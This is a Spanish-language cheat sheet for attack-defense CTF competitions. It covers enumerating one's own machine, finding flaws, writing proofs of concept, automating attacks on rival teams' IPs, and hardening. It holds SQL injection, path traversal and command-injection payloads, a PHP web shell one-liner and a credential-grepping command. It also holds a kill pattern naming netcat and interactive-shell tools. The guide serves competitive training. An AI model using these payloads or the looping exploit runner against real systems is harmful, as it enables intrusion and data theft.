# 🏴‍☠️ CTF Ataque & Defensa — Cheat Sheet paso a paso (con etapa de exploración propia)

> **Escenario:** Al inicio, todos los equipos reciben **la misma máquina**. Puedes explorar la tuya antes de que comiencen los ataques. Lo que descubras en **tu propia** máquina te sirve para: (1) **parchear/mitigar** y (2) **automatizar exploits** contra los demás equipos.

---

## 🗂️ TL;DR (orden de batalla)
1) **Backups + baseline** → 2) **Descubrir servicios/versión** → 3) **Encontrar vulns** en tu máquina → 4) **PoC local** → 5) **Automatizar exploit** contra rivales → 6) **Hardening sin romper** → 7) **Monitoreo + submitter**.

---

## 0) Preparación previa (antes del evento)
- Kali/Parrot actualizado y con: `nmap`, `masscan`, `gobuster/feroxbuster`, `hydra`, `curl`, `jq`, `tmux/screen`, `git`, `python3 (requests, pwntools)`, `sshpass`, `netcat`.
- Crea un repo local `/team-tools/` con:
  - `submit_flag.py`, `exploit_runner.py`, `healthcheck.sh`, `kill_shells.sh`, `notes/`
- Define variables en un `.env` interno (no lo subas a ningún lado):
  ```bash
  export SCOREBOARD_URL="http://scoreboard/flags"
  export TEAM_TOKEN="TOKEN_AQUI"
  export MY_IP="10.66.X.Y"   # tu IP en la red del CTF
  export SUBNET="10.66.0.0/16"  # ejemplo
  ```

---

## 1) T0 — Recibo mi máquina: **baseline y backup exprés** (5–10 min)
### 1.1 Snapshot rápido (por si rompes algo)
```bash
# Backup de configs y servicio web (ajusta rutas):
mkdir -p /root/backup_{etc,web,bin}
tar czf /root/backup_etc.tgz /etc 2>/dev/null
tar czf /root/backup_web.tgz /var/www 2>/dev/null || true
tar czf /root/backup_bin.tgz /usr/local/bin /opt 2>/dev/null || true
```

### 1.2 Inventario inicial
```bash
# Procesos, puertos, servicios
ps aux --sort=-%cpu | head -n 25
ss -tulpn | grep -E 'LISTEN|udp'
systemctl list-units --type=service --state=running

# Usuarios, sudoers, cron
cat /etc/passwd | cut -d: -f1
getent group sudo || getent group wheel
grep -R '' /etc/cron* 2>/dev/null

# Historiales y variables
for h in /root/.bash_history /home/*/.bash_history; do [ -f "$h" ] && tail -n 50 "$h"; done
env | sort

# Estructura sospechosa
find / -xdev -type f -name "*flag*" 2>/dev/null | head
find / -xdev -perm -4000 2>/dev/null   # SUID
```

### 1.3 Fingerprinting local (con `nmap` a localhost)
```bash
nmap -sV -sC -p- 127.0.0.1 -oN local_scan.txt
```
- **Objetivo:** versiones exactas de servicios (Apache/nginx, PHP, DB, SMB, FTP, binarios propios).

### 1.4 Web root / binarios / configs clave
```bash
WEBROOTS="/var/www/html /srv/www /opt/app /var/www"
for d in $WEBROOTS; do [ -d "$d" ] && echo "[*] Listando $d" && find "$d" -maxdepth 2 -type f; done

# Configs típicos:
grep -R --line-number -E "(password|passwd|secret|token|api|key|salt)" /etc /var/www /opt 2>/dev/null | head -n 50

# Archivos ocultos
find /var/www -type f -name ".*" 2>/dev/null
```

**Qué buscas aquí:** credenciales hardcodeadas, rutas a flag, endpoints ocultos, secretos en `.env`, `.git`, configs de DB (`config.php`, `settings.py`, `application.properties`, etc.).

---

## 2) Enumeración dirigida por servicio (en tu máquina)

### 2.1 HTTP/HTTPS
- Verifica **rutas** y **archivos escondidos**:
  ```bash
  curl -i http://127.0.0.1/
  curl -i http://127.0.0.1/robots.txt
  gobuster dir -u http://127.0.0.1 -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,txt,backup,bak,old,zip
  ```
- Busca **.git** expuesto / backups:
  ```bash
  curl -sI http://127.0.0.1/.git/ | head
  ```
- **Patrones de vuln web comunes** (pruébalos contra tu servicio):
  - **SQLi**: `id=1' OR '1'='1-- -`
  - **LFI/Traversal**: `page=../../../../etc/passwd`
  - **Command Injection**: `name=test;id`
  - **Upload inseguro**: subir `.php` o doble extensión `shell.php.jpg`
  - **SSRF**: parámetros que acepten URL (`http://127.0.0.1:...`)

### 2.2 DB (MySQL/Postgres/etc.)
```bash
# MySQL
grep -R "mysql" -n /etc /var/www /opt 2>/dev/null | head
mysql -u root -p -e "SHOW DATABASES;" 2>/dev/null
# Postgres
grep -R "postgres" -n /etc /var/www /opt 2>/dev/null | head
psql -U postgres -c "\l" 2>/dev/null
```

### 2.3 SMB/FTP/SSH
```bash
# SMB
testparm -s 2>/dev/null | sed -n '1,80p'
# FTP banner
echo | nc -nv 127.0.0.1 21
# SSH config
grep -E 'PermitRootLogin|PasswordAuthentication' /etc/ssh/sshd_config
```

### 2.4 Binarios propios / SUID
```bash
file /opt/* /usr/local/bin/* 2>/dev/null | grep -E 'ELF|script'
ldd /opt/app 2>/dev/null
strings -n 8 /opt/app 2>/dev/null | head -n 50
find / -xdev -perm -4000 -type f 2>/dev/null
```

---

## 3) Encontrar la vulnerabilidad (tu mina de oro)
Enfócate en **1–2 superficies** con mayor probabilidad:
- Web con inputs poco validados (SQLi, LFI, Command Injection, Upload).
- Servicio con **credenciales por defecto**.
- Binario SUID vulnerable (buffer overflow / path hijacking).

### 3.1 Pruebas rápidas de SQLi (curl)
```bash
# Reemplaza endpoint y parámetro
curl -s "http://127.0.0.1/item.php?id=1' OR '1'='1-- -" | head
# Boolean-based (compara tamaños de respuesta)
curl -s "http://127.0.0.1/item.php?id=1 AND 1=1" | wc -c
curl -s "http://127.0.0.1/item.php?id=1 AND 1=2" | wc -c
```

### 3.2 Prueba de command injection
```bash
curl -G --data-urlencode "name=test;id" http://127.0.0.1/ping.php
```

### 3.3 LFI
```bash
curl "http://127.0.0.1/view?file=../../../../etc/passwd"
```

### 3.4 Upload inseguro
- Sube `<?php system($_GET['cmd']); ?>` como `x.php` o `x.php.jpg` y llama:
  ```bash
  curl "http://127.0.0.1/uploads/x.php?cmd=id"
  ```

---

## 4) PoC local → Exploit **estable** (en tu máquina)
Una vez confirmada la vuln, crea **PoC estable** que **devuelva solo el flag** (o evidencia clara).

**Template HTTP (Command Injection / LFI / SQLi)**:
```python
#!/usr/bin/env python3
# exploit_local_poc.py
import requests, sys

TARGET = "http://127.0.0.1"  # local primero
def get_flag():
    # EJEMPLO Command Injection
    url = f"{TARGET}/ping.php"
    r = requests.get(url, params={"host": "127.0.0.1; cat /home/ctf/flag.txt"}, timeout=5)
    text = r.text.strip()
    if "FLAG{" in text:
        return text.split("FLAG{",1)[1].split("}",1)[0]
    return None

if __name__ == "__main__":
    flag = get_flag()
    print(f"FLAG{{{flag}}}" if flag else "No flag")
```

**Template TCP (pwntools, pwn/bof o protocolo propio)**:
```python
#!/usr/bin/env python3
# tcp_poc.py
from pwn import remote
def get_flag(host, port):
    io = remote(host, port, timeout=5)
    # protocolo de ejemplo
    io.sendline(b"GET FLAG")
    data = io.recvrepeat(1).decode(errors="ignore")
    io.close()
    return data
```

- **Meta:** PoC que puedas **adaptar a cualquier IP** de rival y que **imprima solo la flag**.

---

## 5) Automatizar ataque a otros equipos (excluye tu IP)
**Exploit Runner** (usa tu PoC y manda flags al scoreboard). Mantén **idempotencia** (no reenvíes flags repetidas).

```python
#!/usr/bin/env python3
# exploit_runner.py
import requests, subprocess, time

SCOREBOARD = "http://scoreboard/flags"
TOKEN = "TOKEN_AQUI"
TEAM_BASE = "10.66.{i}.4"   # ejemplo de esquema de IPs por equipo
N_EQUIPOS = 21
MY_IP = "10.66.1.4"

seen = set()

def submit(flag):
    if flag in seen: 
        return
    seen.add(flag)
    try:
        r = requests.post(SCOREBOARD, json={"flag": f"FLAG{{{flag}}}", "token": TOKEN}, timeout=5)
        print("[+] Submit:", r.status_code, r.text.strip())
    except Exception as e:
        print("[-] Submit error:", e)

def run_exploit(ip):
    try:
        out = subprocess.check_output(["python3", "exploit_local_poc.py", ip], timeout=8)
        s = out.decode().strip()
        if s.startswith("FLAG{") and s.endswith("}"):
            return s[5:-1]  # contenido de la flag
    except Exception as e:
        print(f"[-] Exploit fallo en {ip}:", e)

def targets():
    for i in range(1, N_EQUIPOS+1):
        ip = TEAM_BASE.format(i=i)
        if ip != MY_IP:
            yield ip

if __name__ == "__main__":
    while True:
        for ip in targets():
            flag = run_exploit(ip)
            if flag:
                submit(flag)
        time.sleep(5)  # reintento periódico
```

> Ajusta `TEAM_BASE`, `N_EQUIPOS`, `MY_IP`. Si el organizador da un **CSV/JSON** con IPs de equipos, parsea eso en lugar de generar por patrón.

---

## 6) Hardening rápido **sin romper scoring**
**Regla:** Parchear o mitigar sin bajar el servicio. Evita cambiar rutas/nombres de flag (puede romper el checker).

### 6.1 Firewall base
```bash
iptables -F
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT ACCEPT
iptables -A INPUT -i lo -j ACCEPT
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
# Permite solo puertos del servicio
for p in 22 80 443; do iptables -A INPUT -p tcp --dport $p -j ACCEPT; done
```

### 6.2 Mitigaciones web rápidas
- **Nginx/Apache**: deshabilita ejecución en `/uploads` (no PHP en uploads).
- **Input sanitization** mínima (si hay tiempo) o añadir **deny-list** de metacaracteres peligrosos (`;|&$(){}<>`).
- **Permisos**: quita `write` mundial en webroot y marca dueño apropiado.
  ```bash
  chown -R www-data:www-data /var/www/html
  find /var/www/html -type d -exec chmod 755 {} \;
  find /var/www/html -type f -exec chmod 644 {} \;
  ```

### 6.3 Usuarios/SSH
```bash
sed -i 's/^PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config
sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config
systemctl restart ssh || systemctl restart sshd
```

### 6.4 Kill shells + watchdog
```bash
# kill_shells.sh
ps aux | grep -E "nc|bash -i|perl|python -c" | grep -v grep | awk '{print $2}' | xargs -r kill -9
```
```bash
watch -n 2 "ss -tnp | grep ESTAB"
```

---

## 7) Healthcheck + monitoreo
**Healthcheck** (que tu servicio siga arriba tras parches):
```bash
# healthcheck.sh
TARGET="127.0.0.1"; PORTS=(22 80 443)
for p in "${PORTS[@]}"; do
  timeout 2 bash -c "</dev/tcp/$TARGET/$p" &>/dev/null && echo "UP $p" || echo "DOWN $p"
done
```
Ejecuta en loop/tmux. Si algo cae, **restaura** desde backup y **reinicia** servicio.

---

## 8) Submitter de flags
```python
#!/usr/bin/env python3
# submit_flag.py
import requests, sys, os
URL = os.getenv("SCOREBOARD_URL", "http://scoreboard/flags")
TOKEN = os.getenv("TEAM_TOKEN", "TOKEN_AQUI")

def submit(flag):
    r = requests.post(URL, json={"flag": flag.strip(), "token": TOKEN}, timeout=5)
    print(r.status_code, r.text)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Uso: submit_flag.py FLAG{...}")
        raise SystemExit(1)
    submit(sys.argv[1])
```

---

## 9) Respuesta a incidentes rápida
- **Se rompió el servicio** → restaura backup y `systemctl restart ...`
- **Cuentas maliciosas** → revisa `/etc/passwd`, `last`, `lastlog`, `~/.ssh/authorized_keys`
- **Cron backdoor** → `grep -R '' /etc/cron*`
- **ncat listeners** → `ss -tulpn | grep LISTEN` y mata PID

---

## 10) Consejos tácticos
- Documenta **todo** lo que toques (pequeñas notas en `/root/NOTES.md`).
- El **primer exploit estable** + **automatización** = ventaja masiva.
- Parchea **lo que explotaste** (si tú pudiste, otros también).
- Usa `tmux` con paneles: healthcheck, logs del submitter, exploit runner, tail del servidor web.

---

## Apéndice — Mini “plantillas” útiles

### A. Nmap para versión + scripts
```bash
nmap -sV -sC -Pn -p- 127.0.0.1 -oN local_scan.txt
```

### B. Gobuster “amplio”
```bash
gobuster dir -u http://127.0.0.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 80 -x php,txt,bak,zip,old
```

### C. Dedupe flags (evitar reenvíos)
```bash
sort -u flags_raw.txt > flags_unique.txt
while read f; do python3 submit_flag.py "$f"; done < flags_unique.txt
```

### D. Loop simple de explotación
```bash
while true; do
  python3 exploit_runner.py 2>&1 | tee -a runner.log
  sleep 5
done
```

---

**¡Éxitos!** Mantén la calma, automatiza pronto y no rompas tu propio scoring. 😉
